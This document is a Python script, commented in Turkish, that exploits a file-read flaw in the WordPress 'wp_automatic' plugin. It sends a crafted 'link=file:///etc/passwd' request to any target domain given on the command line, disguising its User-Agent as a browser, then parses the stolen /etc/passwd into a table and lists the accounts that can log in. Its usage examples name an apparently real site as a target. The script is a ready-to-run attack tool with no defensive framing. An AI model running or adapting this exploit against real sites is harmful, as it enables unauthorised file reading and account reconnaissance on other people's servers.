#!/usr/bin/env python3
"""
Passwd Dosyası Çekici ve Parser
Bu script, belirtilen URL'den /etc/passwd dosyasını çeker ve düzenli bir formatta gösterir.
"""

import requests
import json
import sys
import argparse
from typing import List, Dict, Optional
from dataclasses import dataclass
from tabulate import tabulate
from urllib.parse import urlparse


@dataclass
class UserInfo:
    """Kullanıcı bilgilerini tutan veri sınıfı"""
    username: str
    password: str
    uid: int
    gid: int
    gecos: str
    home_dir: str
    shell: str


class PasswdParser:
    """Passwd dosyasını parse eden ana sınıf"""
    
    def __init__(self, domain: str):
        self.domain = domain.rstrip('/')
        self.url = self._build_url()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _build_url(self) -> str:
        """Domain'den passwd URL'ini oluşturur"""
        return f"{self.domain}/?p=3232&wp_automatic=download&link=file:///etc/passwd"
    
    def fetch_passwd_data(self) -> Optional[str]:
        """URL'den passwd verilerini çeker"""
        try:
            print(f"🔍 Veri çekiliyor: {self.url}")
            response = self.session.get(self.url, timeout=10)
            response.raise_for_status()
            
            print("✅ Veri başarıyla çekildi!")
            return response.text
            
        except requests.exceptions.RequestException as e:
            print(f"❌ Veri çekme hatası: {e}")
            return None
    
    def parse_json_response(self, json_data: str) -> Optional[str]:
        """JSON response'u parse eder ve passwd içeriğini çıkarır"""
        try:
            data = json.loads(json_data)
            
            if data.get('status') != 'success':
                print(f"❌ API hatası: {data.get('status')}")
                return None
            
            # text array'inden ilk elemanı al
            text_content = data.get('text', [])
            if not text_content:
                print("❌ Passwd içeriği bulunamadı")
                return None
            
            return text_content[0]
            
        except json.JSONDecodeError as e:
            print(f"❌ JSON parse hatası: {e}")
            return None
    
    def parse_passwd_line(self, line: str) -> Optional[UserInfo]:
        """Tek bir passwd satırını parse eder"""
        if not line.strip():
            return None
        
        parts = line.strip().split(':')
        if len(parts) != 7:
            return None
        
        try:
            return UserInfo(
                username=parts[0],
                password=parts[1],
                uid=int(parts[2]),
                gid=int(parts[3]),
                gecos=parts[4],
                home_dir=parts[5],
                shell=parts[6]
            )
        except ValueError:
            return None
    
    def parse_all_users(self, passwd_content: str) -> List[UserInfo]:
        """Tüm passwd içeriğini parse eder"""
        users = []
        lines = passwd_content.split('\n')
        
        for line in lines:
            user = self.parse_passwd_line(line)
            if user:
                users.append(user)
        
        return users
    
    def display_users_table(self, users: List[UserInfo]):
        """Kullanıcıları tablo formatında gösterir"""
        if not users:
            print("❌ Hiç kullanıcı bulunamadı")
            return
        
        # Tablo için veri hazırla
        table_data = []
        for user in users:
            table_data.append([
                user.username,
                user.password,
                user.uid,
                user.gid,
                user.gecos[:30] + "..." if len(user.gecos) > 30 else user.gecos,
                user.home_dir,
                user.shell
            ])
        
        headers = ["Kullanıcı", "Şifre", "UID", "GID", "Açıklama", "Ana Dizin", "Shell"]
        
        print("\n" + "="*120)
        print("📋 /etc/passwd Dosyası İçeriği")
        print("="*120)
        print(tabulate(table_data, headers=headers, tablefmt="grid"))
        print(f"\n📊 Toplam {len(users)} kullanıcı bulundu")
    
    def display_summary(self, users: List[UserInfo]):
        """Kullanıcı özeti gösterir"""
        if not users:
            return
        
        print("\n" + "="*60)
        print("📊 ÖZET BİLGİLER")
        print("="*60)
        
        # Shell dağılımı
        shell_count = {}
        for user in users:
            shell = user.shell
            shell_count[shell] = shell_count.get(shell, 0) + 1
        
        print("\n🐚 Shell Dağılımı:")
        for shell, count in sorted(shell_count.items(), key=lambda x: x[1], reverse=True):
            print(f"  {shell}: {count} kullanıcı")
        
        # UID aralıkları
        system_users = [u for u in users if u.uid < 1000]
        regular_users = [u for u in users if u.uid >= 1000]
        
        print(f"\n👥 Kullanıcı Kategorileri:")
        print(f"  Sistem kullanıcıları (UID < 1000): {len(system_users)}")
        print(f"  Normal kullanıcılar (UID >= 1000): {len(regular_users)}")
        
        # Login shell'i olan kullanıcılar
        login_users = [u for u in users if u.shell not in ['/usr/sbin/nologin', '/bin/false', '/bin/sync']]
        print(f"  Giriş yapabilen kullanıcılar: {len(login_users)}")
        
        if login_users:
            print(f"\n🔑 Giriş Yapabilen Kullanıcılar:")
            for user in login_users:
                print(f"  - {user.username} (UID: {user.uid}, Shell: {user.shell})")
    
    def run(self):
        """Ana çalıştırma fonksiyonu"""
        print("🚀 Passwd Parser Başlatılıyor...")
        
        # Veri çek
        json_data = self.fetch_passwd_data()
        if not json_data:
            return False
        
        # JSON parse et
        passwd_content = self.parse_json_response(json_data)
        if not passwd_content:
            return False
        
        # Kullanıcıları parse et
        users = self.parse_all_users(passwd_content)
        
        # Sonuçları göster
        self.display_users_table(users)
        self.display_summary(users)
        
        return True


def parse_arguments():
    """Komut satırı argümanlarını parse eder"""
    parser = argparse.ArgumentParser(
        description="Passwd dosyasını belirtilen domain'den çeker ve analiz eder",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Örnek kullanım:
  python3 sc.py https://asianainews.com/
  python3 sc.py https://example.com/
  python3 sc.py @https://target.com/
        """
    )
    
    parser.add_argument(
        'domain',
        help='Hedef domain (http:// veya https:// ile başlamalı, @ işareti opsiyonel)'
    )
    
    return parser.parse_args()


def validate_domain(domain: str) -> str:
    """Domain'i doğrular ve düzenler"""
    # @ işaretini kaldır
    if domain.startswith('@'):
        domain = domain[1:]
    
    # http/https kontrolü
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    
    # Domain'i parse et ve doğrula
    try:
        parsed = urlparse(domain)
        if not parsed.netloc:
            raise ValueError("Geçersiz domain formatı")
        return domain
    except Exception as e:
        raise ValueError(f"Geçersiz domain: {e}")


def main():
    """Ana fonksiyon"""
    try:
        args = parse_arguments()
        domain = validate_domain(args.domain)
        
        print(f"🎯 Hedef domain: {domain}")
        
        parser = PasswdParser(domain)
        success = parser.run()
        
        if success:
            print("\n✅ İşlem başarıyla tamamlandı!")
        else:
            print("\n❌ İşlem başarısız!")
            sys.exit(1)
            
    except ValueError as e:
        print(f"❌ Hata: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n⏹️  İşlem kullanıcı tarafından durduruldu.")
        sys.exit(0)
    except Exception as e:
        print(f"❌ Beklenmeyen hata: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
